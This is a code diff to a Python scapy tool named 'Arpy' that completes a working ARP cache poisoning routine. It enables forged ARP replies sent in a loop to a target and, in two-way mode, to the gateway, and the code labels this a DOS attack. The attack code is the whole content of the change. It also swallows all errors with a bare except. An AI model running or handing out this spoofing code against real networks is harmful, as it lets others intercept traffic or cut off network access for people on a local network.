@@ -27,6 +27,7 @@ class Arpy:
     
     MODULE_NAME = "Arpy"
     LOCAL_MAC =  ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) for ele in range(0,8*6,8)][::-1])
+    STOP = False
 
     #Variables that should not be altered
     
@@ -124,11 +125,10 @@ is_gateway: {self.is_gateway}
 
 
     def inject_packet(self, IP):
-            """Not implemented, need to be modified
+            """This method starts the cache poisoning attack, it depends on two flags, self.two_way and self.STOP
             """
         
             try:
-
                  with open(RECON_PATH, "r") as fp:
                       data = json.load(fp)
                  for key, value in data.items():
@@ -138,19 +138,19 @@ is_gateway: {self.is_gateway}
                  unsolicited_arp_rep_to_tgt = ARP(op=2,psrc=GIP, pdst=self.target, hwdst=self.target_mac)
                  unsolicited_arp_rep_to_gtw = ARP(op=2,psrc=self.target, pdst=GIP, hwdst=GMAC, hwsrc=self.LOCAL_MAC)
                  count = 1
-                 sys.stdout.write("DOS attack in progress. Press CTRL+C to end\n")
+                 self.insert(text="DOS attack in progress. Press CTRL+C to end")
                  
                                                                      
-                 while True :
+                 while not self.STOP :
                      send(unsolicited_arp_rep_to_tgt,verbose=False)
                      if self.two_way:
-                        # send(unsolicited_arp_rep_to_gtw, verbose=False)
-                        print("To router")
-                     sys.stdout.write("   Packet(s) sent : {}\r".format(count))
+                        send(unsolicited_arp_rep_to_gtw, verbose=False)
+                     self.insert(text="Packet(s) sent : {}".format(count))
                      count += 1
                      sleep(self.interval)
-            except KeyboardInterrupt:
-                print("\nUser ended program")
+                 sys.exit()
+            except:
+                pass
     
     def insert(self, text:str =None)->None:
         """This method outputs message to info panel, you can think of it as redirecting stdout to info panel
